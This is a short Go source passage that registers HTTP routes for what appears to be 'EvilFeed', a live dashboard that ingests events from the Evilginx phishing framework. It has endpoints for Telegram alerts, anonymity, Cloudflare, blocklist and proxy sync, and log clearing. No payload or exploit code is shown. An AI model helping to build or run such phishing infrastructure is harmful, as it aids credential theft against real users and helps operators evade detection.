	http.HandleFunc("/api/telegram/push", authMiddleware(handleTelegramPush))
	http.HandleFunc("/api/anonymity/sync", authMiddleware(handleAnonymitySync))
	http.HandleFunc("/api/anonymity/push", authMiddleware(handleAnonymityPush))
	http.HandleFunc("/api/cloudflare/sync", authMiddleware(handleCloudflareSync))
	http.HandleFunc("/api/cloudflare/push", authMiddleware(handleCloudflarePush))
	http.HandleFunc("/api/blocklist/sync", authMiddleware(handleBlocklistSync))
	http.HandleFunc("/api/blocklist/push", authMiddleware(handleBlocklistPush))
	http.HandleFunc("/api/proxy/sync", authMiddleware(handleProxySync))
	http.HandleFunc("/api/proxy/push", authMiddleware(handleProxyPush))
	http.HandleFunc("/api/internal/settings", handleInternalSettings)
	http.HandleFunc("/api/internal/ingest", handleIngestEvent) // Event bridge from Evilginx
	http.HandleFunc("/api/whitelist", authMiddleware(handleWhitelist))
	http.HandleFunc("/api/logs/clear", authMiddleware(clearLogs))

	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		serveWs(hub, w, r)
	})

	addr := getSetting("listen_addr", "")
	if addr == "" {
		addr = os.Getenv("EVILFEED_ADDR")
	}
	if addr == "" {
		addr = ":1337"
	}
	log.Printf("Start viewing the live feed at: http://%s/\n", strings.TrimPrefix(addr, ":"))
	http.ListenAndServe(addr, nil)
}
